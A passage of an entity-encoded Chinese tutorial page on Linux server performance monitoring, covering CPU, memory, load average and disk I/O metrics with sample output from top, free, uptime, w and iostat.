95F4;&#x4E3B;&#x8981;&#x6D88;&#x8017;&#x5728;&#x5185;&#x6838;&#x4E0A;&#xFF0C;&#x53EF;&#x4EE5;&#x4ECE;&#x662F;&#x5426;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x9891;&#x7E41;&#x3001;CPU&#x8FDB;&#x7A0B;&#x6216;&#x7EBF;&#x7A0B;&#x5207;&#x6362;&#x9891;&#x7E41;&#x89D2;&#x5EA6;&#x8003;&#x8651;&#x6027;&#x80FD;&#x7684;&#x4F18;&#x5316;&#xFF1B;&#x5F53;wa&#x5F88;&#x9AD8;&#x65F6;&#xFF0C;&#x8BF4;&#x660E;&#x6709;&#x8FDB;&#x7A0B;&#x5728;&#x8FDB;&#x884C;&#x9891;&#x7E41;&#x7684;IO&#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x80FD;&#x662F;&#x78C1;&#x76D8;IO&#x6216;&#x8005;&#x7F51;&#x7EDC;IO&#x3002;</p><p>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C;%us+%sy&lt;=70%&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;&#x7CFB;&#x7EDF;&#x7684;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x826F;&#x597D;&#x3002;</p><h3 id="2-2-&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;"><a href="#2-2-&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;" class="headerlink" title="2.2 &#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;"></a>2.2 &#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;</h3><p>Linux&#x7684;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x673A;&#x5236;&#x9075;&#x5FAA;&#x5185;&#x5B58;&#x5229;&#x7528;&#x7387;&#x6700;&#x5927;&#x5316;&#x7684;&#x539F;&#x5219;&#x3002;&#x5185;&#x6838;&#x4F1A;&#x5C06;&#x7A7A;&#x4F59;&#x7684;&#x5185;&#x5B58;&#x5212;&#x5206;&#x4E3A;cached&#xFF08;&#x4E0D;&#x5C5E;&#x4E8E;free&#xFF09;&#xFF0C;&#x5BF9;&#x4E8E;&#x6709;&#x9891;&#x7E41;&#x8BFB;&#x53D6;&#x64CD;&#x4F5C;&#x7684;&#x6587;&#x4EF6;&#x6216;&#x6570;&#x636E;&#x4F1A;&#x88AB;&#x4FDD;&#x5B58;&#x5728;cached&#x4E2D;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5BF9;&#x4E8E;linux&#x7CFB;&#x7EDF;&#x6765;&#x8BF4;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x5206;&#x914D;&#x7684;&#x5185;&#x5B58;&#x4E0D;&#x6B62;free&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x540C;&#x65F6;&#x8FD8;&#x5305;&#x62EC;cached&#x7684;&#x5185;&#x5B58;&#xFF08;&#x5176;&#x5B9E;&#x8FD8;&#x5305;&#x62EC;buffers&#x7684;&#x5185;&#x5B58;&#xFF09;&#x3002;</p><p>cached&#x548C;buffers&#x90FD;&#x5C5E;&#x4E8E;&#x7F13;&#x5B58;&#xFF0C;&#x5B83;&#x4EEC;&#x7684;&#x533A;&#x522B;&#x4E3B;&#x8981;&#x5728;&#x4E8E;cached&#x4E3B;&#x8981;&#x7528;&#x6765;&#x7F13;&#x51B2;&#x9891;&#x7E41;&#x8BFB;&#x53D6;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BB0;&#x5FC6;&#x6211;&#x4EEC;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF1B;&#x800C;buffers&#x4E3B;&#x8981;&#x7528;&#x6765;&#x7ED9;&#x5757;&#x8BBE;&#x5907;&#x505A;&#x7684;&#x7F13;&#x51B2;&#x5927;&#x5C0F;&#xFF0C;&#x53EA;&#x8BB0;&#x5F55;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;metadata&#x4EE5;&#x53CA;tracking in-flight pages&#x4FE1;&#x606F;&#xFF0C;&#x6BD4;&#x5982;&#x5B58;&#x50A8;&#x76EE;&#x5F55;&#x91CC;&#x9762;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6743;&#x9650;&#x7B49;&#x3002;</p><p>top&#x5DE5;&#x5177;&#x65E2;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;CPU&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#x4FE1;&#x606F;&#x3002;</p><p><img src="http://192.168.84.188:8081/uploads/1652923863850081274topmemory.png" alt=""></p><p>&#x5728;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x7ECF;&#x5E38;&#x4F1A;&#x7528;&#x5230;&#x7CFB;&#x7EDF;&#x5DF2;&#x7528;&#x5185;&#x5B58;&#x3001;&#x7269;&#x7406;&#x5DF2;&#x7528;&#x5185;&#x5B58;&#x3001;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;&#x4EE5;&#x53CA;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;&#x8FD9;&#x51E0;&#x4E2A;&#x6307;&#x6807;&#xFF0C;&#x5B83;&#x4EEC;&#x7684;&#x8BA1;&#x7B97;&#x516C;&#x5F0F;&#x5982;&#x4E0B;&#xFF1A;</p><p>&#x7CFB;&#x7EDF;&#x5DF2;&#x7528;&#x5185;&#x5B58;MemUsed=MemTotal-MemFree           //&#x5305;&#x542B;buffers&#x548C;cached</p><p>&#x7269;&#x7406;&#x5DF2;&#x7528;&#x5185;&#x5B58;-/+Used= MemTotal-MemFree-MemBuffers-MemCached</p><p>&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;MemUsed%=&#xFF08;MemUsed/ MemTotal&#xFF09;*100%</p><p>&#x7269;&#x7406;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;-/+Used%=(-/+Used/ MemTotal&#xFF09;*100%</p><p>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;&lt;=70%&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;&#x7CFB;&#x7EDF;&#x7684;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#x826F;&#x597D;&#xFF0C;&#x5982;&#x679C;&#x8D85;&#x51FA;&#x5219;&#x8BF4;&#x660E;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x8D44;&#x6E90;&#x7D27;&#x5F20;&#x3002;</p><h3 id="2-3-&#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;"><a href="#2-3-&#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;" class="headerlink" title="2.3 &#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;"></a>2.3 &#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;</h3><p>&#x5F53;&#x53D1;&#x73B0;&#x7CFB;&#x7EDF;&#x51FA;&#x73B0;&#x5361;&#x65AD;&#x6216;&#x8005;&#x8FD0;&#x884C;&#x4E0D;&#x987A;&#x7545;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;uptime&#xFF0C;top&#x6216;&#x8005;w&#x547D;&#x4EE4;&#x6765;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x7684;&#x8D1F;&#x8F7D;&#x60C5;&#x51B5;&#x3002;</p><pre><code>uptime</code></pre><p><code>uptime</code>command<br><img src="http://192.168.84.188:8081/uploads/1652923897275247246uptime_loadaverage.png" alt=""></p><p><code>w</code>command<br><img src="http://192.168.84.188:8081/uploads/1652923915145507123w_loadaverage.png" alt=""></p><p><code>top</code>command<br><img src="http://192.168.84.188:8081/uploads/1652923943410185712top_loadaverage.png" alt=""></p><p>Linux&#x7684;load average&#x8868;&#x793A;&#x7CFB;&#x7EDF;&#x8D1F;&#x8F7D;&#x7684;&#x5E73;&#x5747;&#x503C;&#xFF0C;&#x663E;&#x793A;&#x7684;&#x4E09;&#x4E2A;&#x6570;&#x503C;&#x5206;&#x522B;&#x8868;&#x793A;1&#x5206;&#x949F;&#x3001;5&#x5206;&#x949F;&#x548C;15&#x5206;&#x949F;&#x5185;&#x7684;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x60C5;&#x51B5;&#x3002;&#x8FD9;&#x91CC;&#x7684;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x662F;&#x6307;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#xFF0C;&#x7CFB;&#x7EDF;&#x5904;&#x4E8E;&#x53EF;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x548C;&#x4E0D;&#x53EF;&#x4E2D;&#x65AD;&#x72B6;&#x6001;&#x7684;&#x5E73;&#x5747;&#x8FDB;&#x7A0B;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x7684;&#x7406;&#x89E3;&#x4E3A;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x5C31;&#x662F;&#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x6D3B;&#x8DC3;&#x8FDB;&#x7A0B;&#x6570;&#x3002;&#x5176;&#x4E2D;&#x53EF;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x662F;&#x6307;&#x6B63;&#x5728;&#x4F7F;&#x7528;CPU&#x6216;&#x8005;&#x6B63;&#x5728;&#x7B49;&#x5F85;CPU&#x7684;&#x8FDB;&#x7A0B;&#xFF08;&#x5904;&#x4E8E;R&#x72B6;&#x6001;&#xFF1A;Running&#x6216;&#x8005;Runnable&#x7684;&#x8FDB;&#x7A0B;&#xFF09;&#xFF1B;&#x4E0D;&#x53EF;&#x4E2D;&#x65AD;&#x72B6;&#x6001;&#x7684;&#x8FDB;&#x7A0B;&#x6307;&#x7684;&#x662F;&#x6B63;&#x5904;&#x4E8E;&#x5185;&#x6838;&#x6001;&#x5173;&#x952E;&#x6D41;&#x7A0B;&#x4E2D;&#x7684;&#x8FDB;&#x7A0B;&#xFF0C;&#x5904;&#x4E8E;&#x8FD9;&#x4E2A;&#x6D41;&#x7A0B;&#x7684;&#x8FDB;&#x7A0B;&#x662F;&#x4E0D;&#x53EF;&#x6253;&#x65AD;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#x7B49;&#x5F85;&#x786C;&#x4EF6;&#x8BBE;&#x5907;&#x7684;I/O&#x54CD;&#x5E94;&#x3002;</p><p>&#x4E3E;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x5F53;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x7684;&#x503C;&#x4E3A;4&#xFF1A;</p><p>&#x5BF9;&#x4E8E;&#x53EA;&#x6709;1&#x4E2A;CPU&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x610F;&#x5473;&#x7740;&#x5E73;&#x5747;&#x6709;3&#x4E2A;&#x8FDB;&#x7A0B;&#x7ADE;&#x4E89;&#x4E0D;&#x5230;CPU&#xFF1B;</p><p>&#x5BF9;&#x4E8E;&#x62E5;&#x6709;4&#x4E2A;CPU&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x610F;&#x5473;&#x7740;CPU&#x5229;&#x7528;&#x7387;&#x4E3A;100%&#xFF1B;</p><p>&#x5BF9;&#x4E8E;&#x62E5;&#x6709;8&#x4E2A;CPU&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x610F;&#x5473;&#x7740;CPU&#x5229;&#x7528;&#x7387;&#x4E3A;50%&#xFF0C;&#x6709;&#x4E00;&#x534A;&#x7A7A;&#x95F2;&#x3002;</p><p>&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;&#x5F53;&#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x7684;&#x503C;&#x5982;&#x679C;&#x8D85;&#x8FC7;&#x7CFB;&#x7EDF;CPU&#x7684;&#x6570;&#x91CF;&#x65F6;&#xFF0C;&#x90A3;&#x4E48;&#x7CFB;&#x7EDF;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x9047;&#x5230;&#x6027;&#x80FD;&#x74F6;&#x9888;&#xFF0C;&#x8981;&#x89C6;&#x5177;&#x4F53;&#x60C5;&#x51B5;&#x800C;&#x5B9A;&#x3002;</p><p>&#x5728;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x7ECF;&#x5E38;&#x4F1A;&#x901A;&#x8FC7;&#x6BD4;&#x8F83;1min&#x3001;5min&#x6216;&#x8005;15min&#x7684;&#x503C;&#xFF0C;&#x6765;&#x5224;&#x65AD;&#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x7684;&#x53D8;&#x5316;&#x60C5;&#x51B5;&#xFF1A;</p><p>&#x5982;&#x679C;1min&#x7684;&#x503C;&#x5927;&#x4E8E;5min&#x6216;&#x8005;15min&#x7684;&#x503C;&#xFF0C;&#x8BF4;&#x660E;&#x8D1F;&#x8F7D;&#x5728;&#x589E;&#x52A0;&#xFF1B;</p><p>&#x5982;&#x679C;1min&#x7684;&#x503C;&#x5C0F;&#x4E8E;5min&#x6216;&#x8005;15min&#x7684;&#x503C;&#xFF0C;&#x8BF4;&#x660E;&#x8D1F;&#x8F7D;&#x5728;&#x51CF;&#x5C0F;&#xFF1B;</p><h3 id="2-4-&#x78C1;&#x76D8;I-O"><a href="#2-4-&#x78C1;&#x76D8;I-O" class="headerlink" title="2.4 &#x78C1;&#x76D8;I/O"></a>2.4 &#x78C1;&#x76D8;I/O</h3><p>Linux&#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#x9664;&#x4E86;CPU&#x548C;&#x5185;&#x5B58;&#x5916;&#xFF0C;&#x8FD8;&#x6709;&#x78C1;&#x76D8;IO&#x4E5F;&#x662F;&#x4E00;&#x79CD;&#x5E38;&#x7528;&#x7684;&#x6027;&#x80FD;&#x6307;&#x6807;&#x3002;</p><pre><code class="shell"># RHEL/CentOS# yum install sysstatiostat -x -k 2 3   # &#x6BCF;&#x9694;2S&#x8F93;&#x51FA;&#x78C1;&#x76D8;IO&#x7684;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#xFF0C;&#x5171;&#x91C7;&#x6837;3&#x6B21;</code></pre><p><img src="http://192.168.84.188:8081/uploads/1652923992503954646iostat.png" alt=""></p><p>&#x5B57;&#x6BB5;&#x8BF4;&#x660E;&#xFF1A;</p><p>rrqm/s: &#x6BCF;&#x79D2;&#x5BF9;&#x8BE5;&#x8BBE;&#x5907;&#x7684;&#x8BFB;&#x8BF7;&#x6C42;&#x88AB;&#x5408;&#x5E76;&#x6B21;&#x6570;&#xFF0C;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4F1A;&#x5BF9;&#x8BFB;&#x53D6;&#x540C;&#x5757;(block)&#x7684;&#x8BF7;&#x6C42;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#xFF1B;</p><p>wrqm/s: &#x6BCF;&#x79D2;&#x5BF9;&#x8BE5;&#x8BBE;&#x5907;&#x7684;&#x5199;&#x8BF7;&#x6C42;&#x88AB;&#x5408;&#x5E76;&#x6B21;&#x6570;&#xFF1B;</p><p>r/s: &#x6BCF;&#x79D2;&#x5B8C;&#x6210;&#x7684;&#x8BFB;&#x6B21;&#x6570;&#xFF1B;</p><p>w/s: &#x6BCF;&#x79D2;&#x5B8C;&#x6210;&#x7684;&#x5199;&#x6B21;&#x6570;&#xFF1B;</p><p>rkB/s: &#x6BCF;&#x79D2;&#x8BFB;&#x6570;&#x636E;&#x91CF;(kB&#x4E3A;&#x5355;&#x4F4D;)&#xFF1B;</p><p>wkB/s: &#x6BCF;&#x79D2;&#x5199;&#x6570;&#x636E;&#x91CF;(kB&#x4E3A;&#x5355;&#x4F4D;)&#xFF1B;</p><p>avgrq-sz:&#x5E73;&#x5747;&#x6BCF;&#x6B21;IO&#x64CD;&#x4F5C;&#x7684;&#x6570;&#x636E;&#x91CF;(&#x6247;&#x533A;&#x6570;&#x4E3A;&#x5355;&#x4F4D;)&#xFF1B;</p><p>avgqu-sz: &#x5E73;&#x5747;&#x7B49;&#x5F85;&#x5904;&#x7406;&#x7684;IO&#x8BF7;&#x6C42;&#x961F;&#x5217;&#x957F;&#x5EA6;&#xFF1B;</p><p>await: &#x5E73;&#x5747;&#x6BCF;&#x6B21;IO&#x8BF7;&#x6C42;&#x7B49;&#x5F85;&#x65F6;&#x95F4;(&#x5305;&#x62EC;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#x548C;&#x5904;&#x7406;&#x65F6;&#x95F4;&#xFF0C;&#x6BEB;&#x79D2;&#x4E3A;&#x5355;&#x4F4D;)&#xFF1B;</p><p>svctm: &#x5E73;&#x5747;&#x6BCF;&#x6B21;IO&#x8BF7;&#x6C42;&#x7684;&#x5904;&#x7406;&#x65F6;&#x95F4;(&#x6BEB;&#x79D2;&#x4E3A;&#x5355;&#x4F4D;)&#xFF1B;</p><p>%util: &#x91C7;&#x7528;&#x5468;&#x671F;&#x5185;&#x7528;&#x4E8E;IO&#x64CD;&#x4F5C;&#x7684;&#x65F6;&#x95F4;&#x6BD4;&#x7387;&#xFF0C;&#x5373;IO&#x961F;&#x5217;&#x975E;&#x7A7A;&#x7684;&#x65F6;&#x95F4;&#x6BD4;&#x7387;&#xFF1B;</p><p>&#x5728;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x91CD;&#x70B9;&#x5173;&#x6CE8;iowait%&#x548C;%util&#x53C2;&#x6570;&#x3002;&#x5176;&#x4E2D;iowait% &#x8868;&#x793A;CPU&#x7B49;&#x5F85;IO&#x65F6;&#x95F4;&#x5360;&#x6574;&#x4E2A;CPU&#x5468;&#x671F;&#x7684;&#x767E;&#x5206;&#x6BD4;&#xFF0C;&#x5982;&#x679C;iowait&#x503C;&#x8D85;&#x8FC7;50%&#xFF0C;&#x6216;&#x8005;&#x660E;&#x663E;&#x5927;&#x4E8E;%system&#x3001;%user&#x4EE5;&#x53CA;%idle&#xFF0C;&#x8868;&#x793A;IO&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x95EE;&#x9898;&#x4E86;&#xFF1B;%util&#x8868;&#x793A;&#x78C1;&#x76D8;&#x5FD9;&#x788C;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x4E00;&#x822C;%util&lt;=70%&#x8868;&#x793A;&#x8BE5;&#x78C1;&#x76D8;IO&#x4F7F;&#x7528;&#x72B6;&#x6001;&#x826F;&#x597D;&#x3002;</p><h3 id="2-5-Linux&#x5E38;&#x7528;&#x6027;&#x80FD;&#x547D;&#x4EE4;"><a href="#2-5-Linux&#x5E38;&#x7528;&#x6027;&#x80FD;&#x547D;&#x4EE4;" class="headerlink" title="2.5 Linux&#x5E38;&#x7528;&#x6027;&#x80FD;&#x547D;&#x4EE4;"></a>2.5 Linux&#x5E38;&#x7528;&#x6027;&#x80FD;&#x547D;&#x4EE4;</h3><h4 id="2-5-1-CPU"><a href="#2-5-1-CPU" class="headerlink" title="2.5.1 CPU"></a>2.5.1 CPU</h4><pre><code># &#x83B7;&#x53D6;CPU&#x8BE6;&#x60C5;cat /proc/sys/cpuinfo</code></pre><pre><code class="mbox">[root@rhel7 ~]# cat /proc/cpuinfoprocessor       : 0vendor_id       : GenuineIntelcpu family      : 6model           : 158model name      : Intel(R) Core(TM) i5-7400 CPU @ 3.00GHzstepping        : 9microcode       : 0xffffffffcpu MHz         : 2998.708cache size      : 6144 KBphysical id     : 0siblings        : 1core id         : 0cpu cores       : 1apicid          : 0initial apicid  : 0fpu             : yesfpu_exception   : yescpuid level     : 22wp              : yesflags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon nopl xtopology tsc_reliable nonstop_tsc eagerfpu pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch arat fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid rdseed adx smap clflushopt xsaveopt xsavec xgetbv1bogomips        : 5999.99clflush size    : 64cache_alignment : 64address sizes   : 45 bits physical, 48 bits virtualpower management:[root@rhel7 ~]#</code></pre><p><strong>top</strong></p><pre><code class="mbox">top - 05:37:21 up 2 days, 14:06,  2 users,  load average: 0.00, 0.05, 0.07Tasks: 164 total,   1 running, 163 sleeping,   0 stopped,   0 zombie%Cpu(s):  0.3 us,  0.7 sy,  0.0 ni, 99.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 stKiB Mem :   999696 total,   162172 free,   482632 used,   354892 buff/cacheKiB Swap:  2097148 total,  2064164 free,    32984 used.   303396 avail Mem   PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND   759 root      20   0  305248   3152   2824 S  0.3  0.3   5:39.77 vmtoolsd  1196 mysql     20   0 1131704 193936    564 S  0.3 19.4   1:15.66 mysqld 13017 root      20   0 1621100  76124   4316 S  0.3  7.6   1:13.35 mongod     1 root      20   0  128212   4532   2512 S  0.0  0.5   0:11.69 systemd     2 root      20   0       0      0      0 S  0.0  0.0   0:00.02 kthreadd     3 root      20   0       0      0      0 S  0.0  0.0   0:06.71 ksoftirqd/0     5 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kworker/0:0H     7 root      rt   0       0      0      0 S  0.0  0.0   0:00.00 migration/0     8 root      20   0       0      0      0 S  0.0  0.0   0:00.00 rcu_bh     9 root      20   0       0      0      0 S  0.0  0.0   0:12.27 rcu_sched    10 root      rt   0       0      0      0 S  0.0  0.0   0:03.50 watchdog/0    12 root      20   0       0      0      0 S  0.0  0.0   0:00.00 kdevtmpfs    13 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 netns    14 root      20   0       0      0      0 S  0.0  0.0   0:00.13 khungtaskd    15 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 writeback    16 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kintegrityd    17 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 bioset    18 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kblockd    19 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 md    25 root      20   0       0      0      0 S  0.0  0.0   0:01.89 kswapd0    26 root      25   5       0      0      0 S  0.0  0.0   0:00.00 ksmd    27 root      39  19       0      0      0 S  0.0  0.0   0:01.39 khugepaged    28 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 crypto    36 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kthrotld    38 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kmpath_rdacd    39 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 kpsmoused    41 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 ipv6_addrconf    60 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 deferwq    93 root      20   0       0      0      0 S  0.0  0.0   0:13.32 kauditd   272 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 ata_sff   273 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 mpt_poll_0   274 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 mpt/0   278 root      20   0       0      0      0 S  0.0  0.0   0:00.00 scsi_eh_0   280 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 scsi_tmf_0   284 root      20   0       0      0      0 S  0.0  0.0   0:00.01 scsi_eh_1   286 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 scsi_tmf_1</code></pre><h4 id="2-5-2-&#x5185;&#x5B58;"><a href="#2-5-2-&#x5185;&#x5B58;" class="headerlink" title="2.5.2 &#x5185;&#x5B58;"></a>2.5.2 &#x5185;&#x5B58;</h4><p><strong>free -h</strong></p><pre><code class="mbox">[root@rhel7 ~]# free -h              total        used        free      shared  buff/cache   availableMem:           976M        659M        142M        1.4M        175M        140MSwap:          2.0G        215M        1.8G[root@rhel7 ~]#</code></pre><p><strong>top</strong></p><pre><code class="mbox">top - 05:38:40 up 2 days, 14:07,  2 users,  load average: 0.50, 0.16, 0.23Tasks: 158 total,   1 running, 157 sleeping,   0 stopped,   0 zombie%Cpu(s):  1.4 us,  0.7 sy,  0.0 ni, 98.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 stKiB Mem :   999936 total,   144896 free,   675384 used,   179656 buff/cacheKiB Swap:  2097148 total,  1876980 free,   220168 used.   143004 avail Mem   PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND  2492 root      20   0 1476824  89756   3588 S  1.0  9.0   4:59.62 mongod  2521 root      20   0 1508032  86256   3612 S  1.0  8.6   5:00.86 mongod  1410 root      20   0 1075224  65992   2844 S  0.3  6.6  13:18.62 mongod  1876 root      20   0  140832   1128    464 S  0.3  0.1   0:07.76 sshd  2802 root      20   0 1591648 110528   3800 S  0.3 11.1   4:43.63 mongod  3155 root      20   0 1062216  83944   3040 S  0.3  8.4   2:25.67 mongod     1 root      20   0  128044   2288    604 S  0.0  0.2   0:02.73 systemd     2 root      20   0       0      0      0 S  0.0  0.0   0:00.01 kthreadd     3 root      20   0       0      0      0 S  0.0  0.0   0:05.51 ksoftirqd/0     7 root      rt   0       0      0      0 S  0.0  0.0   0:00.00 migration/0     8 root      20   0       0      0      0 S  0.0  0.0   0:00.00 rcu_bh     9 root      20   0       0      0      0 S  0.0  0.0   0:15.00 rcu_sched    10 root      rt   0       0      0      0 S  0.0  0.0   0:05.00 watchdog/0    12 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 khelper    13 root      20   0       0      0      0 S  0.0  0.0   0:00.00 kdevtmpfs    14 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 netns    15 root      20   0       0      0      0 S  0.0  0.0   0:00.15 khungtaskd    16 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 writebac</code></pre><h4 id="2-5-3-&#x8D1F;&#x8F7D;"><a href="#2-5-3-&#x8D1F;&#x8F7D;" class="headerlink" title="2.5.3 &#x8D1F;&#x8F7D;"></a>2.5.3 &#x8D1F;&#x8F7D;</h4><p><strong>uptime</strong></p><pre><code class="mbox">[root@rhel7 ~]# uptime 05:39:08 up 2 days, 14:07,  2 users,  load average: 0.33, 0.15, 0.22[root@rhel7 ~]#</code></pre><p><strong>top</strong></p><pre><code class="mbox">[root@rhel7 ~]# toptop - 05:38:40 up 2 days, 14:07,  2 users,  load average: 0.50, 0.16, 0.23Tasks: 158 total,   1 running, 157 sleeping,   0 stopped,   0 zombie%Cpu(s):  1.4 us,  0.7 sy,  0.0 ni, 98.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 stKiB Mem :   999936 total,   144896 free,   675384 used,   179656 buff/cacheKiB Swap:  2097148 total,  1876980 free,   220168 used.   143004 avail Mem   PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND  2492 root      20   0 1476824  89756   3588 S  1.0  9.0   4:59.62 mongod  2521 root      20   0 1508032  86256   3612 S  1.0  8.6   5:00.86 mongod  1410 root      20   0 1075224  65992   2844 S  0.3  6.6  13:18.62 mongod  1876 root      20   0  140832   1128    464 S  0.3  0.1   0:07.76 sshd  2802 root      20   0 1591648 110528   3800 S  0.3 11.1   4:43.63 mongod  3155 root      20   0 1062216  83944   3040 S  0.3  8.4   2:25.67 mongod     1 root      20   0  128044   2288    604 S  0.0  0.2   0:02.73 systemd     2 root      20   0       0      0      0 S  0.0  0.0   0:00.01 kthreadd     3 root      20   0       0      0      0 S  0.0  0.0   0:05.51 ksoftirqd/0     7 root      rt   0       0      0      0 S  0.0  0.0   0:00.00 migration/0     8 root      20   0       0      0      0 S  0.0  0.0   0:00.00 rcu_bh     9 root      20   0       0      0      0 S  0.0  0.0   0:15.00 rcu_sched    10 root      rt   0       0      0      0 S  0.0  0.0   0:05.00 watchdog/0    12 root       0 -20       0      0      0 S  0.0  0.0   0:00.00 khelper    13 root      20   0       0      0      0 S  0.0  0.0   0:00.00 kdevtmpfs</code></pre><p><strong>w</strong></p><pre><code class="mbox">[root@rhel7 ~]# w 05:39:57 up 2 days, 14:08,  2 users,  load average: 0.14, 0.13, 0.22USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATroot     pts/1    192.168.73.1     Sat17    5.00s  0.56s  0.00s wroot     pts/2    192.168.73.1     Sat17    9:33   0.30s  0.26s ping www.163.com[root@rhel7 ~]#</code></pre><h4 id="2-5-4-&#x78C1;&#x76D8;"><a href="#2-5-4-&#x78C1;&#x76D8;" class="headerlink" title="2.5.4 &#x78C1;&#x76D8;"></a>2.5.4 &#x78C1;&#x76D8;</h4><p><strong>fdisk</strong></p><pre><code class="mbox">[root@rhel7 ~]# fdisk -lDisk 